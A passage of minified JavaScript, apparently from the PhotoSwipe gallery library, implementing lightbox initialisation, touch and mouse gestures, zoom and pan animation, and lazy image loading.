s,l,c,u,d,h,p,f,m,g,v,y,_,b,w,k,I,C,x,S,E,T,A,O,D,P,N,M,L,U,R,F,j,H,B,z,W,V,q,$,Y,G,Z,J,K,X,Q,ee,te,ne,ie,oe,re,ae,se,le,ce={x:0,y:0},ue={x:0,y:0},de={x:0,y:0},he={},pe=0,fe={},me={x:0,y:0},ge=0,ve=!0,ye=[],_e={},be=!1,we=function(e,t){o.extend(r,t.publicMethods),ye.push(e)},ke=function(e){var t=Bt();return e>t-1?e-t:e<0?t+e:e},Ie={},Ce=function(e,t){return Ie[e]||(Ie[e]=[]),Ie[e].push(t)},xe=function(e){var t=Ie[e];if(t){var n=Array.prototype.slice.call(arguments);n.shift();for(var i=0;i<t.length;i++)t[i].apply(r,n)}},Se=function(){return(new Date).getTime()},Ee=function(e){ae=e,r.bg.style.opacity=e*a.bgOpacity},Te=function(e,t,n,i,o){(!be||o&&o!==r.currItem)&&(i/=o?o.fitRatio:r.currItem.fitRatio),e[T]=y+t+"px, "+n+"px"+_+" scale("+i+")"},Ae=function(e){te&&(e&&(g>r.currItem.fitRatio?be||(Jt(r.currItem,!1,!0),be=!0):be&&(Jt(r.currItem),be=!1)),Te(te,de.x,de.y,g))},Oe=function(e){e.container&&Te(e.container.style,e.initialPosition.x,e.initialPosition.y,e.initialZoomLevel,e)},De=function(e,t){t[T]=y+e+"px, 0px"+_},Pe=function(e,t){if(!a.loop&&t){var n=u+(me.x*pe-e)/me.x,i=Math.round(e-ut.x);(n<0&&i>0||n>=Bt()-1&&i<0)&&(e=ut.x+i*a.mainScrollEndFriction)}ut.x=e,De(e,d)},Ne=function(e,t){var n=dt[e]-fe[e];return ue[e]+ce[e]+n-n*(t/v)},Me=function(e,t){e.x=t.x,e.y=t.y,t.id&&(e.id=t.id)},Le=function(e){e.x=Math.round(e.x),e.y=Math.round(e.y)},Ue=null,Re=function(){Ue&&(o.unbind(document,"mousemove",Re),o.addClass(e,"pswp--has_mouse"),a.mouseUsed=!0,xe("mouseUsed")),Ue=setTimeout((function(){Ue=null}),100)},Fe=function(e,t){var n=$t(r.currItem,he,e);return t&&(ee=n),n},je=function(e){return e||(e=r.currItem),e.initialZoomLevel},He=function(e){return e||(e=r.currItem),e.w>0?a.maxSpreadZoom:1},Be=function(e,t,n,i){return i===r.currItem.initialZoomLevel?(n[e]=r.currItem.initialPosition[e],!0):(n[e]=Ne(e,i),n[e]>t.min[e]?(n[e]=t.min[e],!0):n[e]<t.max[e]&&(n[e]=t.max[e],!0))},ze=function(e){var t="";a.escKey&&27===e.keyCode?t="close":a.arrowKeys&&(37===e.keyCode?t="prev":39===e.keyCode&&(t="next")),t&&(e.ctrlKey||e.altKey||e.shiftKey||e.metaKey||(e.preventDefault?e.preventDefault():e.returnValue=!1,r[t]()))},We=function(e){e&&(G||Y||ne||W)&&(e.preventDefault(),e.stopPropagation())},Ve=function(){r.setScrollOffset(0,o.getScrollY())},qe={},$e=0,Ye=function(e){qe[e]&&(qe[e].raf&&P(qe[e].raf),$e--,delete qe[e])},Ge=function(e){qe[e]&&Ye(e),qe[e]||($e++,qe[e]={})},Ze=function(){for(var e in qe)qe.hasOwnProperty(e)&&Ye(e)},Je=function(e,t,n,i,o,r,a){var s,l=Se();Ge(e);var c=function(){if(qe[e]){if((s=Se()-l)>=i)return Ye(e),r(n),void(a&&a());r((n-t)*o(s/i)+t),qe[e].raf=D(c)}};c()},Ke={shout:xe,listen:Ce,viewportSize:he,options:a,isMainScrollAnimating:function(){return ne},getZoomLevel:function(){return g},getCurrentIndex:function(){return u},isDragging:function(){return q},isZooming:function(){return X},setScrollOffset:function(e,t){fe.x=e,U=fe.y=t,xe("updateScrollOffset",fe)},applyZoomPan:function(e,t,n,i){de.x=t,de.y=n,g=e,Ae(i)},init:function(){if(!s&&!l){var n;r.framework=o,r.template=e,r.bg=o.getChildByClass(e,"pswp__bg"),N=e.className,s=!0,R=o.detectFeatures(),D=R.raf,P=R.caf,T=R.transform,L=R.oldIE,r.scrollWrap=o.getChildByClass(e,"pswp__scroll-wrap"),r.container=o.getChildByClass(r.scrollWrap,"pswp__container"),d=r.container.style,r.itemHolders=k=[{el:r.container.children[0],wrap:0,index:-1},{el:r.container.children[1],wrap:0,index:-1},{el:r.container.children[2],wrap:0,index:-1}],k[0].el.style.display=k[2].el.style.display="none",function(){if(T){var t=R.perspective&&!O;return y="translate"+(t?"3d(":"("),void(_=R.perspective?", 0px)":")")}T="left",o.addClass(e,"pswp--ie"),De=function(e,t){t.left=e+"px"},Oe=function(e){var t=e.fitRatio>1?1:e.fitRatio,n=e.container.style,i=t*e.w,o=t*e.h;n.width=i+"px",n.height=o+"px",n.left=e.initialPosition.x+"px",n.top=e.initialPosition.y+"px"},Ae=function(){if(te){var e=te,t=r.currItem,n=t.fitRatio>1?1:t.fitRatio,i=n*t.w,o=n*t.h;e.width=i+"px",e.height=o+"px",e.left=de.x+"px",e.top=de.y+"px"}}}(),m={resize:r.updateSize,orientationchange:function(){clearTimeout(F),F=setTimeout((function(){he.x!==r.scrollWrap.clientWidth&&r.updateSize()}),500)},scroll:Ve,keydown:ze,click:We};var i=R.isOldIOSPhone||R.isOldAndroid||R.isMobileOpera;for(R.animationName&&R.transform&&!i||(a.showAnimationDuration=a.hideAnimationDuration=0),n=0;n<ye.length;n++)r["init"+ye[n]]();if(t)(r.ui=new t(r,o)).init();xe("firstUpdate"),u=u||a.index||0,(isNaN(u)||u<0||u>=Bt())&&(u=0),r.currItem=Ht(u),(R.isOldIOSPhone||R.isOldAndroid)&&(ve=!1),e.setAttribute("aria-hidden","false"),a.modal&&(ve?e.style.position="fixed":(e.style.position="absolute",e.style.top=o.getScrollY()+"px")),void 0===U&&(xe("initialLayout"),U=M=o.getScrollY());var c="pswp--open ";for(a.mainClass&&(c+=a.mainClass+" "),a.showHideOpacity&&(c+="pswp--animate_opacity "),c+=O?"pswp--touch":"pswp--notouch",c+=R.animationName?" pswp--css_animation":"",c+=R.svg?" pswp--svg":"",o.addClass(e,c),r.updateSize(),h=-1,ge=null,n=0;n<3;n++)De((n+h)*me.x,k[n].el.style);L||o.bind(r.scrollWrap,f,r),Ce("initialZoomInEnd",(function(){r.setContent(k[0],u-1),r.setContent(k[2],u+1),k[0].el.style.display=k[2].el.style.display="block",a.focus&&e.focus(),o.bind(document,"keydown",r),R.transform&&o.bind(r.scrollWrap,"click",r),a.mouseUsed||o.bind(document,"mousemove",Re),o.bind(window,"resize scroll orientationchange",r),xe("bindEvents")})),r.setContent(k[1],u),r.updateCurrItem(),xe("afterInit"),ve||(b=setInterval((function(){$e||q||X||g!==r.currItem.initialZoomLevel||r.updateSize()}),1e3)),o.addClass(e,"pswp--visible")}},close:function(){s&&(s=!1,l=!0,xe("close"),o.unbind(window,"resize scroll orientationchange",r),o.unbind(window,"scroll",m.scroll),o.unbind(document,"keydown",r),o.unbind(document,"mousemove",Re),R.transform&&o.unbind(r.scrollWrap,"click",r),q&&o.unbind(window,p,r),clearTimeout(F),xe("unbindEvents"),zt(r.currItem,null,!0,r.destroy))},destroy:function(){xe("destroy"),Ut&&clearTimeout(Ut),e.setAttribute("aria-hidden","true"),e.className=N,b&&clearInterval(b),o.unbind(r.scrollWrap,f,r),o.unbind(window,"scroll",r),ft(),Ze(),Ie=null},panTo:function(e,t,n){n||(e>ee.min.x?e=ee.min.x:e<ee.max.x&&(e=ee.max.x),t>ee.min.y?t=ee.min.y:t<ee.max.y&&(t=ee.max.y)),de.x=e,de.y=t,Ae()},handleEvent:function(e){e=e||window.event,m[e.type]&&m[e.type](e)},goTo:function(e){var t=(e=ke(e))-u;ge=t,u=e,r.currItem=Ht(u),pe-=t,Pe(me.x*pe),Ze(),ne=!1,r.updateCurrItem()},next:function(){r.goTo(u+1)},prev:function(){r.goTo(u-1)},updateCurrZoomItem:function(e){if(e&&xe("beforeChange",0),k[1].el.children.length){var t=k[1].el.children[0];te=o.hasClass(t,"pswp__zoom-wrap")?t.style:null}else te=null;ee=r.currItem.bounds,v=g=r.currItem.initialZoomLevel,de.x=ee.center.x,de.y=ee.center.y,e&&xe("afterChange")},invalidateCurrItems:function(){w=!0;for(var e=0;e<3;e++)k[e].item&&(k[e].item.needsUpdate=!0)},updateCurrItem:function(e){if(0!==ge){var t,n=Math.abs(ge);if(!(e&&n<2)){r.currItem=Ht(u),be=!1,xe("beforeChange",ge),n>=3&&(h+=ge+(ge>0?-3:3),n=3);for(var i=0;i<n;i++)ge>0?(t=k.shift(),k[2]=t,h++,De((h+2)*me.x,t.el.style),r.setContent(t,u-n+i+1+1)):(t=k.pop(),k.unshift(t),h--,De(h*me.x,t.el.style),r.setContent(t,u+n-i-1-1));if(te&&1===Math.abs(ge)){var o=Ht(I);o.initialZoomLevel!==g&&($t(o,he),Jt(o),Oe(o))}ge=0,r.updateCurrZoomItem(),I=u,xe("afterChange")}}},updateSize:function(t){if(!ve&&a.modal){var n=o.getScrollY();if(U!==n&&(e.style.top=n+"px",U=n),!t&&_e.x===window.innerWidth&&_e.y===window.innerHeight)return;_e.x=window.innerWidth,_e.y=window.innerHeight,e.style.height=_e.y+"px"}if(he.x=r.scrollWrap.clientWidth,he.y=r.scrollWrap.clientHeight,Ve(),me.x=he.x+Math.round(he.x*a.spacing),me.y=he.y,Pe(me.x*pe),xe("beforeResize"),void 0!==h){for(var i,s,l,c=0;c<3;c++)i=k[c],De((c+h)*me.x,i.el.style),l=u+c-1,a.loop&&Bt()>2&&(l=ke(l)),(s=Ht(l))&&(w||s.needsUpdate||!s.bounds)?(r.cleanSlide(s),r.setContent(i,l),1===c&&(r.currItem=s,r.updateCurrZoomItem(!0)),s.needsUpdate=!1):-1===i.index&&l>=0&&r.setContent(i,l),s&&s.container&&($t(s,he),Jt(s),Oe(s));w=!1}v=g=r.currItem.initialZoomLevel,(ee=r.currItem.bounds)&&(de.x=ee.center.x,de.y=ee.center.y,Ae(!0)),xe("resize")},zoomTo:function(e,t,n,i,r){t&&(v=g,dt.x=Math.abs(t.x)-de.x,dt.y=Math.abs(t.y)-de.y,Me(ue,de));var a=Fe(e,!1),s={};Be("x",a,s,e),Be("y",a,s,e);var l=g,c=de.x,u=de.y;Le(s);var d=function(t){1===t?(g=e,de.x=s.x,de.y=s.y):(g=(e-l)*t+l,de.x=(s.x-c)*t+c,de.y=(s.y-u)*t+u),r&&r(t),Ae(1===t)};n?Je("customZoomTo",0,1,n,i||o.easing.sine.inOut,d):d(1)}},Xe={},Qe={},et={},tt={},nt={},it=[],ot={},rt=[],at={},st=0,lt={x:0,y:0},ct=0,ut={x:0,y:0},dt={x:0,y:0},ht={x:0,y:0},pt=function(e,t){return at.x=Math.abs(e.x-t.x),at.y=Math.abs(e.y-t.y),Math.sqrt(at.x*at.x+at.y*at.y)},ft=function(){Z&&(P(Z),Z=null)},mt=function(){q&&(Z=D(mt),At())},gt=function(e,t){return!(!e||e===document)&&!(e.getAttribute("class")&&e.getAttribute("class").indexOf("pswp__scroll-wrap")>-1)&&(t(e)?e:gt(e.parentNode,t))},vt={},yt=function(e,t){return vt.prevent=!gt(e.target,a.isClickableElement),xe("preventDragEvent",e,t,vt),vt.prevent},_t=function(e,t){return t.x=e.pageX,t.y=e.pageY,t.id=e.identifier,t},bt=function(e,t,n){n.x=.5*(e.x+t.x),n.y=.5*(e.y+t.y)},wt=function(){var e=de.y-r.currItem.initialPosition.y;return 1-Math.abs(e/(he.y/2))},kt={},It={},Ct=[],xt=function(e){for(;Ct.length>0;)Ct.pop();return A?(le=0,it.forEach((function(e){0===le?Ct[0]=e:1===le&&(Ct[1]=e),le++}))):e.type.indexOf("touch")>-1?e.touches&&e.touches.length>0&&(Ct[0]=_t(e.touches[0],kt),e.touches.length>1&&(Ct[1]=_t(e.touches[1],It))):(kt.x=e.pageX,kt.y=e.pageY,kt.id="",Ct[0]=kt),Ct},St=function(e,t){var n,i,o,s,l=de[e]+t[e],c=t[e]>0,u=ut.x+t.x,d=ut.x-ot.x;return n=l>ee.min[e]||l<ee.max[e]?a.panEndFriction:1,l=de[e]+t[e]*n,!a.allowPanToNext&&g!==r.currItem.initialZoomLevel||(te?"h"!==ie||"x"!==e||Y||(c?(l>ee.min[e]&&(n=a.panEndFriction,ee.min[e]-l,i=ee.min[e]-ue[e]),(i<=0||d<0)&&Bt()>1?(s=u,d<0&&u>ot.x&&(s=ot.x)):ee.min.x!==ee.max.x&&(o=l)):(l<ee.max[e]&&(n=a.panEndFriction,l-ee.max[e],i=ue[e]-ee.max[e]),(i<=0||d>0)&&Bt()>1?(s=u,d>0&&u<ot.x&&(s=ot.x)):ee.min.x!==ee.max.x&&(o=l))):s=u,"x"!==e)?void(ne||J||g>r.currItem.fitRatio&&(de[e]+=t[e]*n)):(void 0!==s&&(Pe(s,!0),J=s!==ot.x),ee.min.x!==ee.max.x&&(void 0!==o?de.x=o:J||(de.x+=t.x*n)),void 0!==s)},Et=function(e){if(!("mousedown"===e.type&&e.button>0)){if(jt)return void e.preventDefault();if(!V||"mousedown"!==e.type){if(yt(e,!0)&&e.preventDefault(),xe("pointerDown"),A){var t=o.arraySearch(it,e.pointerId,"id");t<0&&(t=it.length),it[t]={x:e.pageX,y:e.pageY,id:e.pointerId}}var n=xt(e),i=n.length;K=null,Ze(),q&&1!==i||(q=oe=!0,o.bind(window,p,r),z=se=re=W=J=G=$=Y=!1,ie=null,xe("firstTouchStart",n),Me(ue,de),ce.x=ce.y=0,Me(tt,n[0]),Me(nt,tt),ot.x=me.x*pe,rt=[{x:tt.x,y:tt.y}],H=j=Se(),Fe(g,!0),ft(),mt()),!X&&i>1&&!ne&&!J&&(v=g,Y=!1,X=$=!0,ce.y=ce.x=0,Me(ue,de),Me(Xe,n[0]),Me(Qe,n[1]),bt(Xe,Qe,ht),dt.x=Math.abs(ht.x)-de.x,dt.y=Math.abs(ht.y)-de.y,Q=pt(Xe,Qe))}}},Tt=function(e){if(e.preventDefault(),A){var t=o.arraySearch(it,e.pointerId,"id");if(t>-1){var n=it[t];n.x=e.pageX,n.y=e.pageY}}if(q){var i=xt(e);if(ie||G||X)K=i;else if(ut.x!==me.x*pe)ie="h";else{var r=Math.abs(i[0].x-tt.x)-Math.abs(i[0].y-tt.y);Math.abs(r)>=10&&(ie=r>0?"h":"v",K=i)}}},At=function(){if(K){var e=K.length;if(0!==e)if(Me(Xe,K[0]),et.x=Xe.x-tt.x,et.y=Xe.y-tt.y,X&&e>1){if(tt.x=Xe.x,tt.y=Xe.y,!et.x&&!et.y&&function(e,t){return e.x===t.x&&e.y===t.y}(K[1],Qe))return;Me(Qe,K[1]),Y||(Y=!0,xe("zoomGestureStarted"));var t=pt(Xe,Qe),n=Mt(t);n>r.currItem.initialZoomLevel+r.currItem.initialZoomLevel/15&&(se=!0);var i=1,o=je(),s=He();if(n<o)if(a.pinchToClose&&!se&&v<=r.currItem.initialZoomLevel){var l=1-(o-n)/(o/1.2);Ee(l),xe("onPinchClose",l),re=!0}else(i=(o-n)/o)>1&&(i=1),n=o-i*(o/3);else n>s&&((i=(n-s)/(6*o))>1&&(i=1),n=s+i*o);i<0&&(i=0),t,bt(Xe,Qe,lt),ce.x+=lt.x-ht.x,ce.y+=lt.y-ht.y,Me(ht,lt),de.x=Ne("x",n),de.y=Ne("y",n),z=n>g,g=n,Ae()}else{if(!ie)return;if(oe&&(oe=!1,Math.abs(et.x)>=10&&(et.x-=K[0].x-nt.x),Math.abs(et.y)>=10&&(et.y-=K[0].y-nt.y)),tt.x=Xe.x,tt.y=Xe.y,0===et.x&&0===et.y)return;if("v"===ie&&a.closeOnVerticalDrag&&"fit"===a.scaleMode&&g===r.currItem.initialZoomLevel){ce.y+=et.y,de.y+=et.y;var c=wt();return W=!0,xe("onVerticalDrag",c),Ee(c),void Ae()}(function(e,t,n){if(e-H>50){var i=rt.length>2?rt.shift():{};i.x=t,i.y=n,rt.push(i),H=e}})(Se(),Xe.x,Xe.y),G=!0,ee=r.currItem.bounds,St("x",et)||(St("y",et),Le(de),Ae())}}},Ot=function(e){if(R.isOldAndroid){if(V&&"mouseup"===e.type)return;e.type.indexOf("touch")>-1&&(clearTimeout(V),V=setTimeout((function(){V=0}),600))}var t;if(xe("pointerUp"),yt(e,!1)&&e.preventDefault(),A){var n=o.arraySearch(it,e.pointerId,"id");if(n>-1)if(t=it.splice(n,1)[0],navigator.msPointerEnabled){t.type={4:"mouse",2:"touch",3:"pen"}[e.pointerType],t.type||(t.type=e.pointerType||"mouse")}else t.type=e.pointerType||"mouse"}var i,s=xt(e),l=s.length;if("mouseup"===e.type&&(l=0),2===l)return K=null,!0;1===l&&Me(nt,s[0]),0!==l||ie||ne||(t||("mouseup"===e.type?t={x:e.pageX,y:e.pageY,type:"mouse"}:e.changedTouches&&e.changedTouches[0]&&(t={x:e.changedTouches[0].pageX,y:e.changedTouches[0].pageY,type:"touch"})),xe("touchRelease",e,t));var c=-1;if(0===l&&(q=!1,o.unbind(window,p,r),ft(),X?c=0:-1!==ct&&(c=Se()-ct)),ct=1===l?Se():-1,i=-1!==c&&c<150?"zoom":"swipe",X&&l<2&&(X=!1,1===l&&(i="zoomPointerUp"),xe("zoomGestureEnded")),K=null,G||Y||ne||W)if(Ze(),B||(B=Dt()),B.calculateSwipeSpeed("x"),W){if(wt()<a.verticalDragRange)r.close();else{var u=de.y,d=ae;Je("verticalDrag",0,1,300,o.easing.cubic.out,(function(e){de.y=(r.currItem.initialPosition.y-u)*e+u,Ee((1-d)*e+d),Ae()})),xe("onVerticalDrag",1)}}else{if((J||ne)&&0===l){if(Nt(i,B))return;i="zoomPointerUp"}if(!ne)return"swipe"!==i?void Lt():void(!J&&g>r.currItem.fitRatio&&Pt(B))}},Dt=function(){var e,t,n={lastFlickOffset:{},lastFlickDist:{},lastFlickSpeed:{},slowDownRatio:{},slowDownRatioReverse:{},speedDecelerationRatio:{},speedDecelerationRatioAbs:{},distanceOffset:{},backAnimDestination:{},backAnimStarted:{},calculateSwipeSpeed:function(i){rt.length>1?(e=Se()-H+50,t=rt[rt.length-2][i]):(e=Se()-j,t=nt[i]),n.lastFlickOffset[i]=tt[i]-t,n.lastFlickDist[i]=Math.abs(n.lastFlickOffset[i]),n.lastFlickDist[i]>20?n.lastFlickSpeed[i]=n.lastFlickOffset[i]/e:n.lastFlickSpeed[i]=0,Math.abs(n.lastFlickSpeed[i])<.1&&(n.lastFlickSpeed[i]=0),n.slowDownRatio[i]=.95,n.slowDownRatioReverse[i]=1-n.slowDownRatio[i],n.speedDecelerationRatio[i]=1},calculateOverBoundsAnimOffset:function(e,t){n.backAnimStarted[e]||(de[e]>ee.min[e]?n.backAnimDestination[e]=ee.min[e]:de[e]<ee.max[e]&&(n.backAnimDestination[e]=ee.max[e]),void 0!==n.backAnimDestination[e]&&(n.slowDownRatio[e]=.7,n.slowDownRatioReverse[e]=1-n.slowDownRatio[e],n.speedDecelerationRatioAbs[e]<.05&&(n.lastFlickSpeed[e]=0,n.backAnimStarted[e]=!0,Je("bounceZoomPan"+e,de[e],n.backAnimDestination[e],t||300,o.easing.sine.out,(function(t){de[e]=t,Ae()})))))},calculateAnimOffset:function(e){n.backAnimStarted[e]||(n.speedDecelerationRatio[e]=n.speedDecelerationRatio[e]*(n.slowDownRatio[e]+n.slowDownRatioReverse[e]-n.slowDownRatioReverse[e]*n.timeDiff/10),n.speedDecelerationRatioAbs[e]=Math.abs(n.lastFlickSpeed[e]*n.speedDecelerationRatio[e]),n.distanceOffset[e]=n.lastFlickSpeed[e]*n.speedDecelerationRatio[e]*n.timeDiff,de[e]+=n.distanceOffset[e])},panAnimLoop:function(){if(qe.zoomPan&&(qe.zoomPan.raf=D(n.panAnimLoop),n.now=Se(),n.timeDiff=n.now-n.lastNow,n.lastNow=n.now,n.calculateAnimOffset("x"),n.calculateAnimOffset("y"),Ae(),n.calculateOverBoundsAnimOffset("x"),n.calculateOverBoundsAnimOffset("y"),n.speedDecelerationRatioAbs.x<.05&&n.speedDecelerationRatioAbs.y<.05))return de.x=Math.round(de.x),de.y=Math.round(de.y),Ae(),void Ye("zoomPan")}};return n},Pt=function(e){return e.calculateSwipeSpeed("y"),ee=r.currItem.bounds,e.backAnimDestination={},e.backAnimStarted={},Math.abs(e.lastFlickSpeed.x)<=.05&&Math.abs(e.lastFlickSpeed.y)<=.05?(e.speedDecelerationRatioAbs.x=e.speedDecelerationRatioAbs.y=0,e.calculateOverBoundsAnimOffset("x"),e.calculateOverBoundsAnimOffset("y"),!0):(Ge("zoomPan"),e.lastNow=Se(),void e.panAnimLoop())},Nt=function(e,t){var n,i,s;if(ne||(st=u),"swipe"===e){var l=tt.x-nt.x,c=t.lastFlickDist.x<10;l>30&&(c||t.lastFlickOffset.x>20)?i=-1:l<-30&&(c||t.lastFlickOffset.x<-20)&&(i=1)}i&&((u+=i)<0?(u=a.loop?Bt()-1:0,s=!0):u>=Bt()&&(u=a.loop?0:Bt()-1,s=!0),s&&!a.loop||(ge+=i,pe-=i,n=!0));var d,h=me.x*pe,p=Math.abs(h-ut.x);return n||h>ut.x==t.lastFlickSpeed.x>0?(d=Math.abs(t.lastFlickSpeed.x)>0?p/Math.abs(t.lastFlickSpeed.x):333,d=Math.min(d,400),d=Math.max(d,250)):d=333,st===u&&(n=!1),ne=!0,xe("mainScrollAnimStart"),Je("mainScroll",ut.x,h,d,o.easing.cubic.out,Pe,(function(){Ze(),ne=!1,st=-1,(n||st!==u)&&r.updateCurrItem(),xe("mainScrollAnimComplete")})),n&&r.updateCurrItem(!0),n},Mt=function(e){return 1/Q*e*v},Lt=function(){var e=g,t=je(),n=He();g<t?e=t:g>n&&(e=n);var i,a=ae;return re&&!z&&!se&&g<t?(r.close(),!0):(re&&(i=function(e){Ee((1-a)*e+a)}),r.zoomTo(e,0,200,o.easing.cubic.out,i),!0)};we("Gestures",{publicMethods:{initGestures:function(){var e=function(e,t,n,i,o){C=e+t,x=e+n,S=e+i,E=o?e+o:""};(A=R.pointerEvent)&&R.touch&&(R.touch=!1),A?navigator.msPointerEnabled?e("MSPointer","Down","Move","Up","Cancel"):e("pointer","down","move","up","cancel"):R.touch?(e("touch","start","move","end","cancel"),O=!0):e("mouse","down","move","up"),p=x+" "+S+" "+E,f=C,A&&!O&&(O=navigator.maxTouchPoints>1||navigator.msMaxTouchPoints>1),r.likelyTouchDevice=O,m[C]=Et,m[x]=Tt,m[S]=Ot,E&&(m[E]=m[S]),R.touch&&(f+=" mousedown",p+=" mousemove mouseup",m.mousedown=m[C],m.mousemove=m[x],m.mouseup=m[S]),O||(a.allowPanToNext=!1)}}});var Ut,Rt,Ft,jt,Ht,Bt,zt=function(t,n,i,s){var l;Ut&&clearTimeout(Ut),jt=!0,Ft=!0,t.initialLayout?(l=t.initialLayout,t.initialLayout=null):l=a.getThumbBoundsFn&&a.getThumbBoundsFn(u);var d=i?a.hideAnimationDuration:a.showAnimationDuration,h=function(){Ye("initialZoom"),i?(r.template.removeAttribute("style"),r.bg.removeAttribute("style")):(Ee(1),n&&(n.style.display="block"),o.addClass(e,"pswp--animated-in"),xe("initialZoom"+(i?"OutEnd":"InEnd"))),s&&s(),jt=!1};if(!d||!l||void 0===l.x)return xe("initialZoom"+(i?"Out":"In")),g=t.initialZoomLevel,Me(de,t.initialPosition),Ae(),e.style.opacity=i?0:1,Ee(1),void(d?setTimeout((function(){h()}),d):h());!function(){var n=c,s=!r.currItem.src||r.currItem.loadError||a.showHideOpacity;t.miniImg&&(t.miniImg.style.webkitBackfaceVisibility="hidden"),i||(g=l.w/t.w,de.x=l.x,de.y=l.y-M,r[s?"template":"bg"].style.opacity=.001,Ae()),Ge("initialZoom"),i&&!n&&o.removeClass(e,"pswp--animated-in"),s&&(i?o[(n?"remove":"add")+"Class"](e,"pswp--animate_opacity"):setTimeout((function(){o.addClass(e,"pswp--animate_opacity")}),30)),Ut=setTimeout((function(){if(xe("initialZoom"+(i?"Out":"In")),i){var r=l.w/t.w,a={x:de.x,y:de.y},c=g,u=ae,p=function(t){1===t?(g=r,de.x=l.x,de.y=l.y-U):(g=(r-c)*t+c,de.x=(l.x-a.x)*t+a.x,de.y=(l.y-U-a.y)*t+a.y),Ae(),s?e.style.opacity=1-t:Ee(u-t*u)};n?Je("initialZoom",0,1,d,o.easing.cubic.out,p,h):(p(1),Ut=setTimeout(h,d+20))}else g=t.initialZoomLevel,Me(de,t.initialPosition),Ae(),Ee(1),s?e.style.opacity=1:Ee(1),Ut=setTimeout(h,d+20)}),i?25:90)}()},Wt={},Vt=[],qt={index:0,errorMsg:'<div class="pswp__error-msg"><a href="%url%" target="_blank">The image</a> could not be loaded.</div>',forceProgressiveLoading:!1,preload:[1,1],getNumItemsFn:function(){return Rt.length}},$t=function(e,t,n){if(e.src&&!e.loadError){var i=!n;if(i&&(e.vGap||(e.vGap={top:0,bottom:0}),xe("parseVerticalMargin",e)),Wt.x=t.x,Wt.y=t.y-e.vGap.top-e.vGap.bottom,i){var o=Wt.x/e.w,r=Wt.y/e.h;e.fitRatio=o<r?o:r;var s=a.scaleMode;"orig"===s?n=1:"fit"===s&&(n=e.fitRatio),n>1&&(n=1),e.initialZoomLevel=n,e.bounds||(e.bounds={center:{x:0,y:0},max:{x:0,y:0},min:{x:0,y:0}})}if(!n)return;return function(e,t,n){var i=e.bounds;i.center.x=Math.round((Wt.x-t)/2),i.center.y=Math.round((Wt.y-n)/2)+e.vGap.top,i.max.x=t>Wt.x?Math.round(Wt.x-t):i.center.x,i.max.y=n>Wt.y?Math.round(Wt.y-n)+e.vGap.top:i.center.y,i.min.x=t>Wt.x?0:i.center.x,i.min.y=n>Wt.y?e.vGap.top:i.center.y}(e,e.w*n,e.h*n),i&&n===e.initialZoomLevel&&(e.initialPosition=e.bounds.center),e.bounds}return e.w=e.h=0,e.initialZoomLevel=e.fitRatio=1,e.bounds={center:{x:0,y:0},max:{x:0,y:0},min:{x:0,y:0}},e.initialPosition=e.bounds.center,e.bounds},Yt=function(e,t,n,i,o,a){t.loadError||i&&(t.imageAppended=!0,Jt(t,i,t===r.currItem&&be),n.appendChild(i),a&&setTimeout((function(){t&&t.loaded&&t.placeholder&&(t.placeholder.style.display="none",t.placeholder=null)}),500))},Gt=function(e){e.loading=!0,e.loaded=!1;var t=e.img=o.createEl("pswp__img","img"),n=function(){e.loading=!1,e.loaded=!0,e.loadComplete?e.loadComplete(e):e.img=null,t.onload=t.onerror=null,t=null};return t.onload=n,t.onerror=function(){e.loadError=!0,n()},t.src=e.src,t},Zt=function(e,t){if(e.src&&e.loadError&&e.container)return t&&(e.container.innerHTML=""),e.container.innerHTML=a.errorMsg.replace("%url%",e.src),!0},Jt=function(e,t,n){if(e.src){t||(t=e.container.lastChild);var i=n?e.w:Math.round(e.w*e.fitRatio),o=n?e.h:Math.round(e.h*e.fitRatio);e.placeholder&&!e.loaded&&(e.placeholder.style.width=i+"px",e.placeholder.style.height=o+"px"),t.style.width=i+"px",t.style.height=o+"px"}},Kt=function(){if(Vt.length){for(var e,t=0;t<Vt.length;t++)(e=Vt[t]).holder.index===e.index&&Yt(e.index,e.item,e.baseDiv,e.img,0,e.clearPlaceholder);Vt=[]}};we("Controller",{publicMethods:{lazyLoadItem:function(e){e=ke(e);var t=Ht(e);t&&(!t.loaded&&!t.loading||w)&&(xe("gettingData",e,t),t.src&&Gt(t))},initController:function(){o.extend(a,qt,!0),r.items=Rt=n,Ht=r.getItemAt,Bt=a.getNumItemsFn,a.loop,Bt()<3&&(a.loop=!1),Ce("beforeChange",(function(e){var t,n=a.preload,i=null===e||e>=0,o=Math.min(n[0],Bt()),s=Math.min(n[1],Bt());for(t=1;t<=(i?s:o);t++)r.lazyLoadItem(u+t);for(t=1;t<=(i?o:s);t++)r.lazyLoadItem(u-t)})),Ce("initialLayout",(function(){r.currItem.initialLayout=a.getThumbBoundsFn&&a.getThumbBoundsFn(u)})),Ce("mainScrollAnimComplete",Kt),Ce("initialZoomInEnd",Kt),Ce("destroy",(function(){for(var e,t=0;t<Rt.length;t++)(e=Rt[t]).container&&(e.container=null),e.placeholder&&(e.placeholder=null),e.img&&(e.img=null),e.preloader&&(e.preloader=null),e.loadError&&(e.loaded=e.loadError=!1);Vt=null}))},getItemAt:function(e){return e>=0&&void 0!==Rt[e]&&Rt[e]},allowProgressiveImg:function(){return a.forceProgressiveLoading||!O||a.mouseUsed||screen.width>1200},setContent:function(e,t){a.loop&&(t=ke(t));var n=r.getItemAt(e.index);n&&(n.container=null);var i,l=r.getItemAt(t);if(l){xe("gettingData",t,l),e.index=t,e.item=l;var c=l.container=o.createEl("pswp__zoom-wrap");if(!l.src&&l.html&&(l.html.tagName?c.appendChild(l.html):c.innerHTML=l.html),Zt(l),$t(l,he),!l.src||l.loadError||l.loaded)l.src&&!l.loadError&&((i=o.createEl("pswp__img","img")).style.opacity=1,i.src=l.src,Jt(l,i),Yt(0,l,c,i));else{if(l.loadComplete=function(n){if(s){if(e&&e.index===t){if(Zt(n,!0))return n.loadComplete=n.img=null,$t(n,he),Oe(n),void(e.index===u&&r.updateCurrZoomItem());n.imageAppended?!jt&&n.placeholder&&(n.placeholder.style.display="none",n.placeholder=null):R.transform&&(ne||jt)?Vt.push({item:n,baseDiv:c,img:n.img,index:t,holder:e,clearPlaceholder:!0}):Yt(0,n,c,n.img,0,!0)}n.loadComplete=null,n.img=null,xe("imageLoadComplete",t,n)}},o.features.transform){var d="pswp__img pswp__img--placeholder";d+=l.msrc?"":" pswp__img--placeholder--blank";var 